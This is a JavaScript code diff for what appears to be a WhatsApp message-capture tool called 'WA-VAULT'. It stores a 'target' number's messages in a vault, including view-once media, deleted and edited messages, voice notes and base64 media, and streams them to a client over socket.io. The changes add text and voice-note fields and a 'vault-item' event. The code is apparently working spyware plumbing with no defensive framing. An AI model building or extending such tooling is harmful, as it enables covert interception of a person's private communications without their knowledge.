@@ -475,8 +475,10 @@ function buildVaultPayload({
   mimeType = '',
   caption = '',
   text = '',
+  textContent = '',
   fileName = '',
   fileSize = 0,
+  isVoiceNote = false,
   isPtt = false,
   isViewOnce = false,
   isPending = false,
@@ -486,19 +488,23 @@ function buildVaultPayload({
   editedText = null,
   editedAt = null,
   sentAt = Date.now(),
-  base64Data = null
+  base64Data = ''
 }) {
+  const finalText = String(textContent || text || caption || '');
+  const finalPtt = Boolean(isVoiceNote || isPtt);
   return {
     id: String(id || Date.now()),
     senderNumber: String(senderNumber || ''),
     senderName: String(senderName || 'Target'),
     mediaType: String(mediaType || 'text'),
-    mimeType: String(mimeType || ''),
+    mimeType: String(mimeType || (mediaType === 'text' ? 'text/plain' : '')),
     caption: String(caption || ''),
-    text: String(text || ''),
+    text: finalText,
+    textContent: finalText,
     fileName: String(fileName || ''),
     fileSize: Number(fileSize || 0),
-    isPtt: Boolean(isPtt),
+    isPtt: finalPtt,
+    isVoiceNote: finalPtt,
     isViewOnce: Boolean(isViewOnce),
     isPending: Boolean(isPending),
     isDeleted: Boolean(isDeleted),
@@ -507,7 +513,7 @@ function buildVaultPayload({
     editedText: editedText ? String(editedText) : null,
     editedAt: editedAt ? Number(editedAt) : null,
     sentAt: Number(sentAt || Date.now()),
-    base64Data: typeof base64Data === 'string' ? base64Data : null
+    base64Data: typeof base64Data === 'string' ? base64Data : ''
   };
 }
 
@@ -1249,9 +1255,10 @@ async function processIncomingMessage(msg, currentSession, sock, sessionId) {
         mediaType: 'text',
         mimeType: 'text/plain',
         text: extracted.text,
+        textContent: extracted.text,
         isViewOnce: false,
         sentAt: Number(msg.messageTimestamp) ? Number(msg.messageTimestamp) * 1000 : Date.now(),
-        base64Data: null
+        base64Data: ''
       });
 
       console.log(`[WA-VAULT Captured] TEKS dari target +${currentSession.targetNumber}: "${extracted.text.slice(0, 40)}"`);
@@ -2033,6 +2040,7 @@ io.on('connection', (socket) => {
             ...item.payload,
             senderNumber: session.targetNumber || item.payload.senderNumber
           };
+          io.to(sessionId).emit('vault-item', finalPayload);
           io.to(sessionId).emit('view-once-media', finalPayload);
         }
         session.unmappedLidQueue.delete(cleanLid);
